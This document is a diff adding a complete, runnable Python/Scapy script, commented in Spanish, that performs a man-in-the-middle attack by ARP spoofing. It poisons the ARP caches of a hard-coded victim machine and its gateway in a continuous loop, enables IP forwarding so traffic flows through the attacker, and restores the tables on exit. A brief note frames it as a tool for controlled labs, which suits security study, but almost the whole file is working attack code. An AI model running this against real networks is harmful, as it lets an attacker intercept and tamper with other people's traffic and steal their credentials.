@@ -1,0 +1,210 @@
+#!/usr/bin/env python3
+"""
+Script de MitM mediante ARP Spoofing
+Objetivo: Interceptar tráfico entre víctima y gateway
+
+ADVERTENCIA: Solo para fines educativos en laboratorios controlados
+Autor: [Tu Nombre]
+Fecha: Febrero 2026
+"""
+
+from scapy.all import *
+import time
+import sys
+import signal
+import os
+
+# Variables globales para controlar la ejecución
+running = True
+victim_ip = None
+gateway_ip = None
+interface = None
+
+def signal_handler(sig, frame):
+    """Maneja la señal de interrupción (Ctrl+C)"""
+    global running
+    print("\n[!] Detectada interrupción. Restaurando tablas ARP...")
+    running = False
+    restore_arp(victim_ip, gateway_ip, interface)
+    restore_arp(gateway_ip, victim_ip, interface)
+    print("[✓] Ataque detenido y tablas ARP restauradas")
+    sys.exit(0)
+
+def get_mac(ip, interface):
+    """Obtiene la dirección MAC de una IP usando ARP"""
+    try:
+        print(f"[*] Obteniendo MAC de {ip}...")
+        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                   timeout=3, iface=interface, verbose=0)
+        if ans:
+            return ans.hwsrc
+    except Exception as e:
+        print(f"[!] Error al obtener MAC de {ip}: {e}")
+    return None
+
+def arp_spoof(target_ip, spoof_ip, target_mac, interface):
+    """Envía paquetes ARP falsos para envenenar la caché ARP"""
+    arp_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, 
+                                          psrc=spoof_ip, hwdst=target_mac)
+    sendp(arp_packet, iface=interface, verbose=0)
+    return arp_packet
+
+def restore_arp(target_ip, source_ip, interface):
+    """Restaura la tabla ARP a su estado original"""
+    target_mac = get_mac(target_ip, interface)
+    source_mac = get_mac(source_ip, interface)
+    
+    if target_mac and source_mac:
+        # Enviar paquete ARP correcto
+        arp_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
+                                              psrc=source_ip,
+                                              hwsrc=source_mac)
+        sendp(arp_packet, iface=interface, count=5, verbose=0)
+        print(f"[✓] ARP restaurado para {target_ip}")
+    else:
+        print(f"[!] No se pudo restaurar ARP para {target_ip}")
+
+def check_ip_forwarding():
+    """Verifica si el IP forwarding está habilitado"""
+    try:
+        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
+            status = f.read().strip()
+            return status == '1'
+    except:
+        return False
+
+def enable_ip_forwarding():
+    """Habilita el IP forwarding"""
+    try:
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+        print("[✓] IP forwarding habilitado")
+        return True
+    except:
+        print("[!] Error al habilitar IP forwarding")
+        return False
+
+def mitm_attack(victim_ip, gateway_ip, interface):
+    """Realiza el ataque Man-in-the-Middle continuo"""
+    print("\n" + "="*60)
+    print("[*] Iniciando ataque MitM mediante ARP Spoofing")
+    print("="*60)
+    print(f"[*] Víctima:   {victim_ip}")
+    print(f"[*] Gateway:   {gateway_ip}")
+    print(f"[*] Interfaz:  {interface}")
+    print(f"[*] Presiona Ctrl+C para detener y restaurar")
+    print("="*60 + "\n")
+    
+    # Verificar IP forwarding
+    if not check_ip_forwarding():
+        print("[!] ADVERTENCIA: IP forwarding está deshabilitado")
+        response = input("[?] ¿Habilitar IP forwarding automáticamente? (s/n): ")
+        if response.lower() == 's':
+            enable_ip_forwarding()
+        else:
+            print("[!] Sin IP forwarding, el tráfico no fluirá correctamente")
+            print("[!] Habilítalo manualmente: echo 1 > /proc/sys/net/ipv4/ip_forward")
+    else:
+        print("[✓] IP forwarding ya está habilitado\n")
+    
+    # Obtener direcciones MAC
+    print("[*] Resolviendo direcciones MAC...")
+    victim_mac = get_mac(victim_ip, interface)
+    gateway_mac = get_mac(gateway_ip, interface)
+    
+    if not victim_mac:
+        print(f"[!] ERROR: No se pudo obtener MAC de la víctima {victim_ip}")
+        print("[!] Verifica que la víctima esté en línea y en la misma red")
+        return
+    if not gateway_mac:
+        print(f"[!] ERROR: No se pudo obtener MAC del gateway {gateway_ip}")
+        print("[!] Verifica la configuración de red")
+        return
+    
+    print(f"\n[✓] MAC Víctima ({victim_ip}):  {victim_mac}")
+    print(f"[✓] MAC Gateway ({gateway_ip}): {gateway_mac}")
+    print("\n[+] Iniciando envenenamiento ARP...\n")
+    
+    packet_count = 0
+    start_time = time.time()
+    
+    try:
+        while running:
+            # Envenenar ARP de la víctima (hacerle creer que somos el gateway)
+            arp_spoof(victim_ip, gateway_ip, victim_mac, interface)
+            
+            # Envenenar ARP del gateway (hacerle creer que somos la víctima)
+            arp_spoof(gateway_ip, victim_ip, gateway_mac, interface)
+            
+            packet_count += 2
+            
+            # Mostrar progreso cada 20 paquetes (10 ciclos)
+            if packet_count % 20 == 0:
+                elapsed = time.time() - start_time
+                print(f"[+] Paquetes ARP enviados: {packet_count} | Tiempo: {elapsed:.1f}s")
+                sys.stdout.flush()
+            
+            # Esperar 2 segundos entre envíos
+            time.sleep(2)
+            
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(f"\n[!] Error durante el ataque: {e}")
+    finally:
+        elapsed = time.time() - start_time
+        print(f"\n[✓] Total paquetes ARP enviados: {packet_count}")
+        print(f"[✓] Tiempo total de ataque: {elapsed:.2f}s")
+
+def show_banner():
+    """Muestra el banner del script"""
+    banner = """
+    ╔════════════════════════════════════════════════╗
+    ║   ARP MitM Attack - Educational Tool           ║
+    ║   Man-in-the-Middle via ARP Spoofing           ║
+    ╚════════════════════════════════════════════════╝
+    """
+    print(banner)
+
+if __name__ == "__main__":
+    show_banner()
+    
+    # Configuración según tu topología
+    victim_ip = "11.6.5.12"     # Máquina Ubuntu víctima
+    gateway_ip = "11.6.5.1"     # Router/Switch (puerta de enlace)
+    interface = "eth0"          # Interfaz de tu máquina Kali
+    
+    print("=== ATAQUE MITM MEDIANTE ARP SPOOFING ===")
+    print("ADVERTENCIA: Solo para fines educativos en laboratorios controlados")
+    print()
+    
+    # Verificar permisos de root
+    if os.geteuid() != 0:
+        print("[!] ERROR: Este script requiere privilegios de superusuario")
+        print("[!] Ejecuta con: sudo python3 arp_mitm_attack.py")
+        sys.exit(1)
+    
+    # Registrar manejador de señal
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    # Mostrar configuración
+    print(f"Configuración del ataque:")
+    print(f"  - Víctima:  {victim_ip}")
+    print(f"  - Gateway:  {gateway_ip}")
+    print(f"  - Interfaz: {interface}")
+    print()
+    
+    # Confirmación del usuario
+    print("NOTA: Este ataque interceptará TODO el tráfico entre la víctima y el gateway")
+    response = input("¿Continuar con el ataque? (s/n): ")
+    if response.lower() != 's':
+        print("[!] Ataque cancelado por el usuario")
+        sys.exit(0)
+    
+    # Ejecutar ataque
+    mitm_attack(victim_ip, gateway_ip, interface)
+
+
+
+
+
+
